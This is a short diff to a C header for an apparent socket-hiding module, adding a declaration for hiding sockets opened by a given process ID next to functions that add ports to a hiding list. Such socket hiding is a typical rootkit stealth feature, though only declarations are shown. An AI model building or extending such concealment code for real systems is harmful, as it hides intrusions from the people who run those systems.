@@ -14,6 +14,9 @@ int sockethider_init(void);
 /* cleanup socket hider module */
 void sockethider_cleanup(void);
 
+/* hide sockets opened by PID */
+void hide_sockets_by_pid(unsigned short pid);
+
 /* add socket to hiding list */
 void add_to_socket_list(int port, enum socket_type type);
 
